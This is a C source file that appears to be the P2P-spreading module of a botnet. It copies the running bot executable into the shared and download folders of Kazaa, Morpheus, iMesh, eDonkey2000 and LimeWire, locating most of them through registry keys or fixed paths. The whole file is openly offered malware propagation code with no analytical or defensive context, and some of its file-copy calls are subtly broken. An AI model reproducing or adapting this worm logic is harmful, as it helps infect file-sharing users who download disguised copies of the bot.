#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_P2P

void KazaaInit(char *botfile) 
{
	char buffer[MAX_PATH];

	HKEY hkey;
	DWORD dwSize = 128;

	fRegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\KAZAA\\LocalContent", 0, KEY_READ, &hkey);
	if(fRegQueryValueEx(hkey, "Dir0", NULL, NULL, (unsigned char*)buffer, &dwSize) == ERROR_SUCCESS) {
		replacestr(buffer, "012345:", "");
		CopyFile(botfile, buffer, FALSE);
	}
	fRegCloseKey(hkey);

	return;
}

void MorpheusInit(char *botfile) 
{
	char buffer[MAX_PATH];

	HKEY hkey;
	DWORD dwSize = 128;

	fRegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Morpheus", 0, KEY_READ, &hkey);
	if(fRegQueryValueEx(hkey, "Install_Dir", NULL, NULL, (unsigned char*)buffer, &dwSize) == ERROR_SUCCESS) {
		_snprintf(buffer, sizeof(buffer), "%s\\My Shared Folder", buffer);
		CreateDirectory(buffer, 0);
		CopyFile(botfile, buffer, FALSE);
	}
	fRegCloseKey(hkey);

	return;
}

void iMeshInit(char *botfile) 
{
	char buffer[MAX_PATH];

	HKEY hkey = NULL;
	DWORD dwSize = 128;

	fRegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\iMesh\\Client", 0, KEY_READ, &hkey);
	if(fRegQueryValueEx(hkey, "DownloadsLocation", NULL, NULL, (unsigned char*)buffer, &dwSize) == ERROR_SUCCESS) {
		CopyFile(botfile, buffer, FALSE);
	}
	fRegCloseKey(hkey);

	return;
}

void eDonkey2KInit(char *botfile) 
{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\eDonkey2000\\incoming");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void LimeWireInit(char *botfile) 
{
	char buffer[MAX_PATH];

	_snprintf(buffer, sizeof(buffer), "\\Program Files\\LimeWire\\Shared");
	CreateDirectory(buffer, 0);
	CopyFile(botfile, buffer, FALSE);

	return;
}

void P2PSpread(void) 
{
	char botfile[MAX_PATH];
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	KazaaInit(botfile);
	MorpheusInit(botfile);
	eDonkey2KInit(botfile);
	LimeWireInit(botfile);
	iMeshInit(botfile);

	return;
}
#endif